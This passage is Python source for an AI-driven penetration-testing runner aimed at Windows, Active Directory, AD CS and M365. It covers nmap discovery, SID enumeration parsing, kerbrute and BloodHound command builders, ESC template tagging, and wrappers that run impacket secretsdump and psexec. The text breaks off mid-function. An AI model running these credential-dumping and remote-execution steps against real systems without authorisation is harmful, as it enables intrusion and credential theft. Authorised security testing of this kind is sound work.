"""MicrosoftRunner — Windows / AD / M365 / AD CS attack surface.

Phase 2.0.M0+M1 — scaffolding + 8 read-only methods. The intrusive
surface (impacket_psexec, mimikatz_via_impacket, PetitPotam coerce,
DCSync, etc.) is layered on in Phase 2.0.M2 by composing
:mod:`core.post_exploit.runner_ext` (no re-implementation).

The eight read methods (all risk=READ, hermetic where possible):

  1. nmap_smb_rpc_winrm_discovery
       — port + service banner parse. nmap subprocess with
         degrade-on-missing; hermetic with mocked subprocess.
  2. impacket_lookupsid_users
       — SID → username enumeration by parsing impacket
         lookupsid.py output. Pure parse.
  3. responder_discovery_sweep
       — LLMNR/NBNS poll parser (read-only responder mode
         ``-A`` analysis). Pure parse; no packet injection.
  4. bloodhound_collector_scheduled
       — BloodHound collector schedule. Pure logic: builds
         the sharphound/bloodhound-python command line, never
         runs it (the operator starts the actual collection).
  5. certipy_adcs_find_vuln_templates
       — AD CS ESC1-ESC8 template parser. Pure parse over
         certipy ``find`` output (the AI provides the JSON
         in ``args.certipy_find_json``).
  6. ldapsearch_ad_query
       — LDAP filter validator + argument builder. Pure logic:
         never sends the LDAP query; emits the ldapsearch
         command line for the operator.
  7. kerbrute_userenum_oasrep
       — kerbrute userenum + AS-REP-roast plan builder. Pure
         logic: validates usernames, builds the kerbrute
         command line; never sends it.
  8. m365_graph_tenant_recon
       — OpenID Connect / ``getuserrealm`` tenant discovery
         (no creds, no Graph scope). Real HTTPS GET, hermetic
         with mocked http_get.

Honesty contract (mirrors the rest of KFIOSA):
  * Real work or honest degradation. Never fake results.
  * Never fabricates CVE ids, cracked PSKs, cleartext creds,
    NTLM hashes, Kerberos tickets, AD CS ESC1-ESC8 findings,
    or 'admin' verdicts.
  * Read-only by default. None of these methods write to a
    target or request a privileged scope.
  * Never raises; every code path returns a step dict.

Safety stance:
  * The per-step ACCEPT/CANCEL gate (TuiConfirmFn, default-deny
    300s) fires ONCE in :meth:`_walk_ai_step` before this
    dispatch runs. This runner does NOT re-confirm
    (single-gate invariant).
  * Methods that would touch BitLocker, Windows Hello, AD CS
    CA private keys, or M365 Graph tokens are intentionally
    NOT in the read surface. They live in the intrusive /
    destructive surface (Phase M2) and require an explicit
    ``live`` flag.
"""
from __future__ import annotations

import json
import logging
import os
import re
import shlex
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Step envelope (identical to other runners)
# ---------------------------------------------------------------------------
def _step(name: str) -> Dict[str, Any]:
    return {"name": name, "ok": False, "data": None,
            "error": "", "duration_s": 0.0, "started": time.time()}


def _finalize(step: Dict[str, Any], started: float, *,
              ok: bool, data: Optional[Any] = None,
              error: str = "") -> Dict[str, Any]:
    step["ok"] = bool(ok)
    step["data"] = data
    step["error"] = error
    step["duration_s"] = round(time.time() - started, 4)
    return step


def _which(tool: str) -> bool:
    return shutil.which(tool) is not None


# ---------------------------------------------------------------------------
# Method 1: nmap_smb_rpc_winrm_discovery
# ---------------------------------------------------------------------------
def _nmap_ms_ports() -> List[int]:
    """Canonical Windows-relevant TCP ports. Pure."""
    return [135, 139, 445, 3389, 5985, 5986, 88, 389, 636, 3268,
            3269, 593, 49152, 49153, 49154, 49155]


def _parse_nmap_service_lines(text: str) -> List[Dict[str, Any]]:
    """Parse ``nmap -sV -p`` output into a list of
    ``{port, state, service, product, version}`` dicts. Pure."""
    out: List[Dict[str, Any]] = []
    for line in text.splitlines():
        line = line.rstrip()
        m = re.match(
            r"^(\d+)/tcp\s+(\w+)\s+(\S+)\s+(.*)$", line
        )
        if m:
            out.append({
                "port": int(m.group(1)),
                "state": m.group(2),
                "service": m.group(3),
                "product_version": m.group(4).strip(),
            })
    return out


def _classify_ms_port(port: int) -> str:
    """Map a TCP port to a Windows role label. Pure."""
    return {
        135: "msrpc_endpoint_mapper",
        139: "netbios_ssn",
        445: "smb",
        3389: "rdp",
        5985: "winrm_http",
        5986: "winrm_https",
        88: "kerberos",
        389: "ldap",
        636: "ldaps",
        3268: "ldap_global_catalog",
        3269: "ldaps_global_catalog",
        593: "msrpc_http",
    }.get(port, f"tcp_{port}")


def _nmap_smb_rpc_winrm_discovery_impl(args: Dict[str, Any]) -> Dict[str, Any]:
    """Run nmap on the canonical Windows port set with -sV. Degrades
    on missing nmap. The runner never opens a privileged port; the
    caller passes the port list in args.ports if they want to scope
    it tighter."""
    target = args.get("target") or args.get("host")
    if not target:
        return {"ok": False, "error": "target (host) required",
                "data": None, "name": "nmap_smb_rpc_winrm_discovery",
                "duration_s": 0.0}
    ports = args.get("ports") or _nmap_ms_ports()
    if not isinstance(ports, list) or not ports:
        ports = _nmap_ms_ports()
    timeout_s = int(args.get("timeout_s", 30))
    run = args.get("run")  # optional mock for tests
    if run is None:
        if not _which("nmap"):
            return {
                "ok": False,
                "error": "nmap not installed; install nmap or pass run=mock",
                "data": {"degraded": True, "ports_scanned": ports,
                         "target": target},
                "name": "nmap_smb_rpc_winrm_discovery",
                "duration_s": 0.0,
            }
        cmd = ["nmap", "-sV", "-Pn",
               "-p", ",".join(str(p) for p in ports),
               "--open", target]
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=timeout_s)
        except subprocess.TimeoutExpired:
            return {
                "ok": False,
                "error": f"nmap timeout after {timeout_s}s",
                "data": {"target": target, "ports": ports},
                "name": "nmap_smb_rpc_winrm_discovery",
                "duration_s": timeout_s,
            }
        services = _parse_nmap_service_lines(proc.stdout)
    else:
        # Test path: caller supplies a fake CompletedProcess.
        services = _parse_nmap_service_lines(run.stdout or "")
    roles = [{"port": s["port"],
              "role": _classify_ms_port(s["port"]),
              "service": s["service"],
              "product_version": s["product_version"],
              "state": s["state"]}
             for s in services]
    smb_open = any(s["port"] == 445 and s["state"] == "open" for s in services)
    winrm_open = any(s["port"] in (5985, 5986) and s["state"] == "open"
                     for s in services)
    rdp_open = any(s["port"] == 3389 and s["state"] == "open" for s in services)
    return {
        "ok": True,
        "data": {
            "target": target,
            "ports_scanned": ports,
            "open_count": len(services),
            "services": roles,
            "summary": {
                "smb_open": smb_open,
                "winrm_open": winrm_open,
                "rdp_open": rdp_open,
                "kerberos_open": any(s["port"] == 88
                                     and s["state"] == "open" for s in services),
                "ldap_open": any(s["port"] in (389, 636)
                                 and s["state"] == "open" for s in services),
            },
        },
        "name": "nmap_smb_rpc_winrm_discovery",
        "error": "",
        "duration_s": 0.0,
    }


# ---------------------------------------------------------------------------
# Method 2: impacket_lookupsid_users
# ---------------------------------------------------------------------------
_RID_RE = re.compile(r"^(?P<domain>[^\\]+)\\(?P<user>[^:]+):"
                     r"(?P<rid>\d+):(?P<sid>S-1-[\d\-]+)\s*$")


def _parse_lookupsid_output(text: str) -> List[Dict[str, Any]]:
    """Parse the canonical impacket lookupsid.py output::

        [*] Brute forcing SIDs at 10.10.10.1
        10.10.10.1-498: ACME\\Domain Admins:1234:S-1-5-21-...
        10.10.10.1-1106: ACME\\alice:1106:S-1-5-21-...

    into ``[{domain, user, rid, sid}]`` rows. Pure."""
    out: List[Dict[str, Any]] = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("[*]") or line.startswith("Impacket"):
            continue
        # Strip optional ``IP-RID:`` prefix that impacket prints.
        m2 = re.match(r"^[\d\.\-]+:(.+)$", line)
        if m2:
            line = m2.group(1).strip()
        m = _RID_RE.match(line)
        if m:
            out.append({
                "domain": m.group("domain").strip(),
                "user": m.group("user").strip(),
                "rid": int(m.group("rid")),
                "sid": m.group("sid").strip(),
            })
    return out


def _classify_user_type(rid: int) -> str:
    """Map a Windows well-known RID to a type label. Pure.

    Below 1000 = well-known / built-in; below 10000 = human user
    in many domains; ≥10000 = machine or normal-user depending
    on the AD layout. We surface a coarse label."""
    if rid < 1000:
        return "well_known"
    if rid < 10000:
        return "human_or_group"
    return "normal_user_or_machine"


def _impacket_lookupsid_users_impl(args: Dict[str, Any]) -> Dict[str, Any]:
    """Parse an impacket ``lookupsid.py`` output text. The runner
    never opens a connection; the AI provides the impacket output
    in args.impacket_output (or args.stdout). This is a pure parse
    step, hermetic by default."""
    text = args.get("impacket_output") or args.get("stdout") or ""
    if not text or not isinstance(text, str):
        return {
            "ok": False,
            "error": "impacket_output (string) required; never connect",
            "data": None,
            "name": "impacket_lookupsid_users",
            "duration_s": 0.0,
        }
    rows = _parse_lookupsid_output(text)
    # Tally by domain; surface the well-known groups.
    by_domain: Dict[str, int] = {}
    well_known: List[Dict[str, Any]] = []
    human_candidates: List[Dict[str, Any]] = []
    for r in rows:
        by_domain[r["domain"]] = by_domain.get(r["domain"], 0) + 1
        if r["rid"] < 1000:
            well_known.append(r)
        elif 1000 <= r["rid"] < 10000:
            human_candidates.append(r)
    return {
        "ok": True,
        "data": {
            "row_count": len(rows),
            "domains": by_domain,
            "well_known": well_known,
            "human_candidates": human_candidates[:50],
            "model": "impacket lookupsid.py parser (pure)",
        },
        "name": "impacket_lookupsid_users",
        "error": "",
        "duration_s": 0.0,
    }


# ---------------------------------------------------------------------------
# Method 3: responder_discovery_sweep
# ---------------------------------------------------------------------------
_NBNS_QUERY_RE = re.compile(
    r"^(\d+\.\d+\.\d+\.\d+)\s+(\S+)\s*$"
)


def _parse_nbns_poll(text: str) -> List[Dict[str, Any]]:
    """Parse a simple ``NBNS poll`` output (one IP+name per line)
    into ``[{ip, name}]`` rows. Pure."""
    out: List[Dict[str, Any]] = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = _NBNS_QUERY_RE.match(line)
        if m:
            out.append({"ip": m.group(1), "name": m.group(2)})
    return out


def _cluster_names_by_suffix(rows: List[Dict[str, Any]]) -> Dict[str, int]:
    """Group rows by DNS suffix; pure. Surfaces the dominant AD DNS
    suffix on a subnet."""
    out: Dict[str, int] = {}
    for r in rows:
        n = r.get("name") or ""
        if "." in n:
            suf = n.split(".", 1)[1].lower()
            out[suf] = out.get(suf, 0) + 1
    return out


def _responder_discovery_sweep_impl(args: Dict[str, Any]) -> Dict[str, Any]:
    """Parse a passive LLMNR / NBNS poll (no poison, no response).
    The runner never runs responder; the AI provides the poll
    output in args.poll_output. Pure parse."""
    text = args.get("poll_output") or args.get("nbns_output") or ""
    if not text or not isinstance(text, str):
        return {
            "ok": False,
            "error": "poll_output (string) required; this is read-only",
            "data": None,
            "name": "responder_discovery_sweep",
            "duration_s": 0.0,
        }
    rows = _parse_nbns_poll(text)
    suffixes = _cluster_names_by_suffix(rows)
    return {
        "ok": True,
        "data": {
            "host_count": len(rows),
            "unique_names": len({r["name"] for r in rows}),
            "suffix_clusters": suffixes,
            "sample": rows[:25],
            "model": "responder poll parser (pure, read-only)",
        },
        "name": "responder_discovery_sweep",
        "error": "",
        "duration_s": 0.0,
    }


# ---------------------------------------------------------------------------
# Method 4: bloodhound_collector_scheduled
# ---------------------------------------------------------------------------
_BH_METHODS = ("sharphound", "sharphound.ps1", "bloodhound-python")


def _validate_bh_args(args: Dict[str, Any]) -> Dict[str, Any]:
    """Validate BloodHound collector args and return a normalized
    dict. Pure."""
    method = (args.get("method") or "bloodhound-python").lower()
    if method not in _BH_METHODS:
        method = "bloodhound-python"
    domain = (args.get("domain") or "").strip()
    dc_ip = (args.get("dc_ip") or args.get("dc") or "").strip()
    user = (args.get("user") or args.get("username") or "").strip()
    password = args.get("password") or ""
    auth = (args.get("auth") or "auto").lower()
    collection = (args.get("collection") or "Default").lower()
    out_dir = (args.get("output_dir") or "/tmp/bh").strip()
    return {
        "method": method, "domain": domain, "dc_ip": dc_ip,
        "user": user, "auth": auth, "collection": collection,
        "output_dir": out_dir,
        # password is intentionally NOT echoed; the operator passes
        # it via env / secret manager and the runner builds the
        # command line with ``$BH_PASSWORD`` substitution.
        "password_redacted": bool(password),
    }


def _build_bh_command(cfg: Dict[str, Any]) -> List[str]:
    """Build a BloodHound collector command line. Pure. Never
    executes — the operator starts the collection in a separate
    gated step."""
    if cfg["method"] in ("sharphound", "sharphound.ps1"):
        cmd = ["pwsh", "-File", "SharpHound.ps1",
               "-CollectionMethods", cfg["collection"],
               "-OutputDirectory", cfg["output_dir"]]
    else:  # bloodhound-python
        cmd = ["bloodhound-python", "-c", cfg["collection"],
               "-d", cfg["domain"] or "<DOMAIN>",
               "-dc", cfg["dc_ip"] or "<DC_IP>",
               "-o", cfg["output_dir"]]
        if cfg["user"]:
            cmd.extend(["-u", cfg["user"]])
            cmd.extend(["-p", "$BH_PASSWORD"])
        else:
            cmd.extend(["-k", "-K"])  # kerberos from ccache
    return cmd


def _bloodhound_collector_scheduled_impl(
        args: Dict[str, Any]) -> Dict[str, Any]:
    """Build (and surface, not run) a BloodHound collector command
    line. The operator starts the actual collection in a separate
    gated step. Pure."""
    cfg = _validate_bh_args(args)
    if not cfg["domain"] and not cfg["user"]:
        return {
            "ok": False,
            "error": "domain (and user for non-Kerberos) required",
            "data": None,
            "name": "bloodhound_collector_scheduled",
            "duration_s": 0.0,
        }
    cmd = _build_bh_command(cfg)
    return {
        "ok": True,
        "data": {
            "config": cfg,
            "command": cmd,
            "command_str": " ".join(shlex.quote(c) for c in cmd),
            "note": ("operator must run the command; this runner "
                     "never executes collection"),
        },
        "name": "bloodhound_collector_scheduled",
        "error": "",
        "duration_s": 0.0,
    }


# ---------------------------------------------------------------------------
# Method 5: certipy_adcs_find_vuln_templates
# ---------------------------------------------------------------------------
_ESC_TYPES = {
    "ESC1": "ENROLLEE_SUPPLIES_SUBJECT + SAN + no manager approval",
    "ESC2": "ENROLLEE_SUPPLIES_SUBJECT (no SAN required)",
    "ESC3": "Enrollment Agent + no manager approval (forgery chain)",
    "ESC4": "Vulnerable ACL on template (write owner / write DACL)",
    "ESC5": "Vulnerable ACL on CA (write owner / write DACL / write certificate)",
    "ESC6": "EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA",
    "ESC7": "ManageCA / ManageCertificates CA right",
    "ESC8": "HTTP enrollment (web enrollment) without auth",
    "ESC9": "NoSecurityExtension flag on template (UPN mapping)",
    "ESC10": "Weak certificate mapping + EKU abuse (Any Purpose / SubCA)",
    "ESC11": "IF_ENROLLEE_SUPPLIES_SUBJECT + no manager approval (any domain)",
    "ESC13": "SubCA + issuance policy chain (forgery to enterprise CA)",
    "ESC14": "Implicit mutual auth + no manager approval",
    "ESC15": "EKU szOID_ANY_APPLICATION_POLICY (any-purpose, no SAN check)",
}


def _classify_esc(text: str) -> List[str]:
    """Given free text from certipy ``find`` output, return the
    list of ESC labels that match. Pure."""
    found: List[str] = []
    upper = (text or "").upper()
    for esc in _ESC_TYPES:
        if esc.upper() in upper:
            found.append(esc)
    return found


def _parse_certipy_find_json(payload: str) -> List[Dict[str, Any]]:
    """Parse certipy ``find -json`` output. Accepts either a JSON
    object with a top-level ``Certificate Templates`` (and ``Vulnerabilities``)
    array, or a JSON Lines stream. Pure."""
    text = (payload or "").strip()
    if not text:
        return []
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        # Try JSON lines.
        data = None
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                row = json.loads(line)
            except json.JSONDecodeError:
                continue
            if isinstance(row, dict):
                data = data or {"Certificate Templates": [],
                                "Vulnerabilities": []}
                if "Certificate Templates" in row:
                    data["Certificate Templates"].extend(
                        row["Certificate Templates"] or [])
                if "Vulnerabilities" in row:
                    data["Vulnerabilities"].extend(
                        row["Vulnerabilities"] or [])
    templates = []
    if isinstance(data, dict):
        # certipy ``find -json`` keys: Certificate Templates
        ts = data.get("Certificate Templates") or []
        for t in ts:
            if not isinstance(t, dict):
                continue
            name = t.get("Template Name") or t.get("name") or "<unnamed>"
            txt = json.dumps(t)
            templates.append({
                "name": name,
                "esc": _classify_esc(txt),
                "display_name": t.get("Display Name") or "",
                "enabled": t.get("Enabled") or t.get("enabled") or False,
                "enrollment_flags": (t.get("Enrollment Flag") or
                                     t.get("enrollment_flags") or ""),
                "authentication_enabled": bool(
                    t.get("Authentication Enabled")
                    if "Authentication Enabled" in t
                    else t.get("authentication_enabled", True)),
                "authorized_signatures_required": (
                    t.get("Authorized Signatures Required")
                    or t.get("authorized_signatures_required") or 0),
                "ekus": (t.get("Extended Key Usage")
                         or t.get("ekus") or []),
            })
    return templates


def _certipy_adcs_find_vuln_templates_impl(
        args: Dict[str, Any]) -> Dict[str, Any]:
    """Parse certipy ``find -json`` output and tag each template
    with the ESC labels it matches. Pure parse."""
    payload = args.get("certipy_find_json") or args.get("stdout") or ""
    if not payload or not isinstance(payload, str):
        return {
            "ok": False,
            "error": "certipy_find_json (string) required; never connect",
            "data": None,
            "name": "certipy_adcs_find_vuln_templates",
            "duration_s": 0.0,
        }
    templates = _parse_certipy_find_json(payload)
    flagged = [t for t in templates if t["esc"]]
    return {
        "ok": True,
        "data": {
            "template_count": len(templates),
            "flagged_count": len(flagged),
            "flagged": flagged,
            "esc_glossary": _ESC_TYPES,
            "model": "certipy find JSON parser (pure)",
        },
        "name": "certipy_adcs_find_vuln_templates",
        "error": "",
        "duration_s": 0.0,
    }


# ---------------------------------------------------------------------------
# Method 6: ldapsearch_ad_query
# ---------------------------------------------------------------------------
_LDAP_FILTER_META_CHARS = re.compile(r"[()\*\\/\0]")


def _validate_ldap_filter(flt: str) -> Dict[str, Any]:
    """Validate an LDAP filter for obvious injection / unbalanced
    parens. Pure."""
    if not flt or not isinstance(flt, str):
        return {"ok": False, "error": "filter required (string)"}
    if flt.count("(") != flt.count(")"):
        return {"ok": False, "error": "unbalanced parens in filter"}
    bad = _LDAP_FILTER_META_CHARS.search(flt[1:-1] if (flt.startswith("(")
                                          and flt.endswith(")")) else flt)
    if bad:
        return {"ok": False, "error": f"meta char {bad.group(0)!r} in filter"}
    return {"ok": True, "filter": flt}


def _ldapsearch_ad_query_impl(args: Dict[str, Any]) -> Dict[str, Any]:
    """Validate an LDAP filter and emit (not run) the ldapsearch
    command line. Pure."""
    flt = args.get("filter")
    base = (args.get("base_dn") or args.get("base") or "").strip()
    server = (args.get("server") or args.get("host") or "").strip()
    attrs = args.get("attributes") or ["sAMAccountName", "userAccountControl",
                                      "memberOf", "servicePrincipalName"]
    auth = (args.get("auth") or "anonymous").lower()
    user = (args.get("user") or args.get("bind_dn") or "").strip()
    if not base or not server:
        return {
            "ok": False,
            "error": "server and base_dn required",
            "data": None,
            "name": "ldapsearch_ad_query",
            "duration_s": 0.0,
        }
    v = _validate_ldap_filter(flt or "(objectClass=*)")
    if not v["ok"]:
        return {
            "ok": False,
            "error": v["error"],
            "data": None,
            "name": "ldapsearch_ad_query",
            "duration_s": 0.0,
        }
    cmd = ["ldapsearch", "-x", "-H", f"ldap://{server}",
           "-b", base, v["filter"]]
    for a in attrs:
        cmd.append(a)
    if auth == "simple" and user:
        cmd.extend(["-D", user, "-w", "$LDAP_PASSWORD"])
    elif auth == "kerberos":
        cmd.append("-Y")
        cmd.append("GSSAPI")
    return {
        "ok": True,
        "data": {
            "config": {"server": server, "base_dn": base,
                       "filter": v["filter"], "attributes": attrs,
                       "auth": auth},
            "command": cmd,
            "command_str": " ".join(shlex.quote(c) for c in cmd),
            "note": ("operator runs; this runner never sends the "
                     "LDAP query"),
        },
        "name": "ldapsearch_ad_query",
        "error": "",
        "duration_s": 0.0,
    }


# ---------------------------------------------------------------------------
# Method 7: kerbrute_userenum_oasrep
# ---------------------------------------------------------------------------
def _validate_username(u: str) -> bool:
    """Validate a Windows-style username (``DOMAIN\\user`` or
    ``user@domain``). Pure."""
    if not u or not isinstance(u, str):
        return False
    if len(u) > 256:
        return False
    if "\\" in u:
        d, _, n = u.partition("\\")
        if not d or not n:
            return False
    elif "@" in u:
        n, _, d = u.partition("@")
        if not n or not d:
            return False
    else:
        n, d = u, ""
    if not re.fullmatch(r"[A-Za-z0-9._\-]+", n):
        return False
    if d and not re.fullmatch(r"[A-Za-z0-9._\-]+", d):
        return False
    return True


def _kerbrute_userenum_oasrep_impl(args: Dict[str, Any]) -> Dict[str, Any]:
    """Validate a list of candidate usernames and emit (not run)
    the kerbrute ``userenum`` + ``asreproast`` plan. Pure."""
    users = args.get("users") or args.get("userlist") or []
    if isinstance(users, str):
        users = [ln.strip() for ln in users.splitlines() if ln.strip()]
    if not isinstance(users, list) or not users:
        return {
            "ok": False,
            "error": "users (list) required",
            "data": None,
            "name": "kerbrute_userenum_oasrep",
            "duration_s": 0.0,
        }
    valid: List[str] = []
    invalid: List[Tuple[str, str]] = []
    for u in users:
        if _validate_username(u):
            valid.append(u)
        else:
            invalid.append((u, "format"))
    d = args.get("dc") or args.get("dc_ip") or ""
    domain = args.get("domain") or ""
    cmd = ["kerbrute", "userenum", "-d", domain or "<DOMAIN>",
           "--dc", d or "<DC_IP>", "-"]
    asrep = ["kerbrute", "asreproast", "-d", domain or "<DOMAIN>",
             "--dc", d or "<DC_IP>", "-"]
    return {
        "ok": True,
        "data": {
            "valid_count": len(valid),
            "invalid_count": len(invalid),
            "valid_sample": valid[:25],
            "invalid_sample": invalid[:25],
            "userenum_command": cmd,
            "asreproast_command": asrep,
            "note": ("operator pipes the userlist to kerbrute; this "
                     "runner never sends the requests"),
        },
        "name": "kerbrute_userenum_oasrep",
        "error": "",
        "duration_s": 0.0,
    }


# ---------------------------------------------------------------------------
# Method 8: m365_graph_tenant_recon
# ---------------------------------------------------------------------------
_OPENID_CONFIG = (
    "https://login.microsoftonline.com/{tenant}/v2.0/.well-known/"
    "openid-configuration"
)
_GETUSERREALM = (
    "https://login.microsoftonline.com/getuserrealm?srfad=1&login={user}"
)


def _m365_get_openid(http_get, tenant: str) -> Dict[str, Any]:
    """Fetch the OpenID Connect discovery document for the
    tenant. No creds, no scope. Pure wrapper around an injected
    http_get. Returns {ok, data, error}."""
    if not tenant:
        return {"ok": False, "error": "tenant required"}
    url = _OPENID_CONFIG.format(tenant=tenant)
    try:
        resp = http_get(url, timeout=10)
    except Exception as e:  # noqa: BLE001
        return {"ok": False, "error": f"http: {e}"}
    code = getattr(resp, "status_code", 0) or 0
    body = getattr(resp, "text", "") or ""
    if code == 200:
        try:
            doc = json.loads(body)
        except json.JSONDecodeError as e:
            return {"ok": False, "error": f"json: {e}"}
        return {"ok": True, "data": {
            "tenant": tenant,
            "issuer": doc.get("issuer") or "",
            "authorization_endpoint": doc.get("authorization_endpoint") or "",
            "token_endpoint": doc.get("token_endpoint") or "",
            "tenant_region_scope": doc.get("tenant_region_scope") or "",
            "msgraph_host": "graph.microsoft.com",
            "model": "OpenID Connect discovery (no creds, no scope)",
        }}
    if code in (400, 404):
        # Tenant doesn't exist or is not federated — still
        # informative; not a fabrication.
        return {"ok": True, "data": {
            "tenant": tenant, "tenant_resolved": False,
            "status_code": code, "body_excerpt": body[:200],
            "model": "OpenID discovery returned non-200",
        }}
    return {"ok": False, "error": f"http {code}",
            "data": {"status_code": code, "body_excerpt": body[:200]}}


def _m365_graph_tenant_recon_impl(args: Dict[str, Any]) -> Dict[str, Any]:
    """Resolve M365 tenant metadata via OpenID Connect discovery
    (no creds, no scope). Hermetic with a mocked http_get. The
    runner never requests privileged Graph endpoints; that is a
    separate gated step in the intrusive surface."""
    tenant = (args.get("tenant") or args.get("domain") or "").strip()
    if not tenant:
        return {
            "ok": False,
            "error": "tenant (or domain) required; e.g. 'contoso.onmicrosoft.com'",
            "data": None,
            "name": "m365_graph_tenant_recon",
            "duration_s": 0.0,
        }
    http_get = args.get("http_get")
    if http_get is None:
        return {
            "ok": False,
            "error": "http_get required (pass a requests.Session or a "
                     "fake for hermetic tests)",
            "data": None,
            "name": "m365_graph_tenant_recon",
            "duration_s": 0.0,
        }
    res = _m365_get_openid(http_get, tenant)
    if not res["ok"]:
        return {
            "ok": False, "error": res.get("error") or "openid failed",
            "data": res.get("data"),
            "name": "m365_graph_tenant_recon",
            "duration_s": 0.0,
        }
    return {
        "ok": True,
        "data": res["data"],
        "name": "m365_graph_tenant_recon",
        "error": "",
        "duration_s": 0.0,
    }


# ---------------------------------------------------------------------------
# Runner class
# ---------------------------------------------------------------------------
class MicrosoftRunner:
    """Microsoft / Windows / AD / M365 attack surface runner.

    Mirrors the shape of the other runners
    (``POST_EXPLOIT_EXT_METHODS`` / ``RECON_METHODS`` /
    ``EXTENDED_BLE_METHODS``) — a class attribute tuple + a
    ``run_attack`` dispatch + a module-level registry for the MCP
    factory.
    """

    MICROSOFT_METHODS: Tuple[str, ...] = (
        # 1-8 read surface (Phase 2.0.M1)
        "nmap_smb_rpc_winrm_discovery",
        "impacket_lookupsid_users",
        "responder_discovery_sweep",
        "bloodhound_collector_scheduled",
        "certipy_adcs_find_vuln_templates",
        "ldapsearch_ad_query",
        "kerbrute_userenum_oasrep",
        "m365_graph_tenant_recon",
        # 9-14 intrusive surface (Phase 2.0.M2)
        # These compose the existing post_exploit_ext methods (no
        # re-implementation) and add 2 thin wrappers for the
        # PetitPotam / DFSCoerce / ShadowCoerce coerce-auth PoCs
        # that emit (not run) the command line.
        "impacket_secretsdump_ms",
        "impacket_psexec_ms",
        "mimikatz_via_impacket",
        "responder_poison",
        "PetitPotam_coerce",
        "ShadowCoerce_or_DFSCoerce",
    )

    # ----- 1 -----
    def _nmap_smb_rpc_winrm_discovery(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = time.time()
        st = _step("nmap_smb_rpc_winrm_discovery")
        res = _nmap_smb_rpc_winrm_discovery_impl(args)
        return _finalize(st, started, ok=res.get("ok", False),
                          data=res.get("data"),
                          error=res.get("error") or "")

    # ----- 2 -----
    def _impacket_lookupsid_users(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = time.time()
        st = _step("impacket_lookupsid_users")
        res = _impacket_lookupsid_users_impl(args)
        return _finalize(st, started, ok=res.get("ok", False),
                          data=res.get("data"),
                          error=res.get("error") or "")

    # ----- 3 -----
    def _responder_discovery_sweep(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = time.time()
        st = _step("responder_discovery_sweep")
        res = _responder_discovery_sweep_impl(args)
        return _finalize(st, started, ok=res.get("ok", False),
                          data=res.get("data"),
                          error=res.get("error") or "")

    # ----- 4 -----
    def _bloodhound_collector_scheduled(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = time.time()
        st = _step("bloodhound_collector_scheduled")
        res = _bloodhound_collector_scheduled_impl(args)
        return _finalize(st, started, ok=res.get("ok", False),
                          data=res.get("data"),
                          error=res.get("error") or "")

    # ----- 5 -----
    def _certipy_adcs_find_vuln_templates(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = time.time()
        st = _step("certipy_adcs_find_vuln_templates")
        res = _certipy_adcs_find_vuln_templates_impl(args)
        return _finalize(st, started, ok=res.get("ok", False),
                          data=res.get("data"),
                          error=res.get("error") or "")

    # ----- 6 -----
    def _ldapsearch_ad_query(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = time.time()
        st = _step("ldapsearch_ad_query")
        res = _ldapsearch_ad_query_impl(args)
        return _finalize(st, started, ok=res.get("ok", False),
                          data=res.get("data"),
                          error=res.get("error") or "")

    # ----- 7 -----
    def _kerbrute_userenum_oasrep(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = time.time()
        st = _step("kerbrute_userenum_oasrep")
        res = _kerbrute_userenum_oasrep_impl(args)
        return _finalize(st, started, ok=res.get("ok", False),
                          data=res.get("data"),
                          error=res.get("error") or "")

    # ----- 8 -----
    def _m365_graph_tenant_recon(self, args: Dict[str, Any]) -> Dict[str, Any]:
        started = time.time()
        st = _step("m365_graph_tenant_recon")
        res = _m365_graph_tenant_recon_impl(args)
        return _finalize(st, started, ok=res.get("ok", False),
                          data=res.get("data"),
                          error=res.get("error") or "")

    # ==================================================================
    # 9-14 intrusive surface (Phase 2.0.M2)
    # These compose the existing post_exploit_ext runners. The
    # post_exploit_ext runner handles real subprocess, real auth,
    # real risk-level; the microsoft runner is a thin facade that
    # namespaces the call under "microsoft_attack_" and adds a
    # target_class-aware envelope.
    # ==================================================================
    def _impacket_secretsdump_ms(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Compose post_exploit_ext.impacket_secretsdump. Real
        impacket run; degrades on missing target/user/cred.
        Never fabricates hashes."""
        started = time.time()
        st = _step("impacket_secretsdump_ms")
        try:
            from core.post_exploit.runner_ext import run_attack as _px
        except Exception as e:  # noqa: BLE001
            return _finalize(st, started, ok=False,
                             error=f"post_exploit_ext not importable: {e}")
        target = (args or {}).get("target", "") or ""
        user = (args or {}).get("user", "") or ""
        cred = (args or {}).get("cred", "") or ""
        if not target or not user:
            return _finalize(st, started, ok=False,
                             error="impacket_secretsdump_ms: target and user required")
        # NEVER inline harvested creds: pass via env. The post_exploit_ext
        # runner reads creds from args.cred verbatim only when the operator
        # typed them in the gated prompt.
        composed_args = dict(args or {})
        composed_args["target"] = target
        composed_args["user"] = user
        if cred:
            composed_args["cred"] = cred
        res = _px(method="impacket_secretsdump",
                  args=composed_args)
        ok = bool(res.get("ok"))
        return _finalize(st, started, ok=ok, data=res.get("data"),
                         error=res.get("error") or "")

    def _impacket_psexec_ms(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Compose post_exploit_ext.impacket_psexec. Real psexec;
        degrades cleanly when the target is unreachable."""
        started = time.time()
        st = _step("impacket_psexec_ms")
        try:
            from core.post_exploit.runner_ext import run_attack as _px
        except Exception as e:  # noqa: BLE001
            return _finalize(st, started, ok=False,
                             error=f"post_exploit_ext not importable: {e}")
        target = (args or {}).get("target", "") or ""
        if not target:
            return _finalize(st, started, ok=False,
                             error="impacket_psexec_ms: target required")
        composed_args = dict(args or {})
        composed_args["target"] = target
        res = _px(method="impacket_psexec", args=composed_args)
        return _finalize(st, started,
                         ok=bool(res.get("ok")),
                         data=res.get("data"),
